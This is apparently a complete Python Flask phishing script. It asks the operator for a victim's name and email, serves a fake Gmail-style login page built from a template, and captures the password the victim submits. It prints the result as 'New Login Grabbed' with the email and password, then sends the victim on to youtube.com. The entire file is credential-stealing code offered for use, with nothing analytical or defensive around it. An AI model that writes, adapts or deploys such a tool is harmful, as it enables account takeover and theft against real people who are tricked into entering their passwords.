from symtable import Symbol
from flask import Flask, redirect, url_for
from flask import render_template
from flask import request
from cryptography.fernet import Fernet
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from termcolor import colored
from terminaltables import AsciiTable

table_data = [
    ('', 'Sites',''),
    ('Gmail','Instagram','Chatgum')
    
]
table = AsciiTable(table_data)
print(table.table)


site=input(f"[X] choose a site to start: ")
if site=='Gmail':
    name=input(f"[X] Victims Name if known: ")
    email=input(f"[X] Victims email Address if known: ")

app=Flask(__name__)
@app.route('/',methods=['GET','POST'])
def home():
    if site=='Gmail':
        if request.method==('GET'):
            return render_template(f"{site}.html",email=email,name=name)
        elif request.method==('POST'):
            symbol=colored('[/\]','red')
            symbol2=colored('[-]','green')
            password=request.form['password']
            print(f"""{symbol} New Login Grabbed
    {symbol2} Email:{email} 
    {symbol2} PASSWORD:{password}
    """)    
            return redirect("https://youtube.com")


app.run(debug=False)

##made by dragon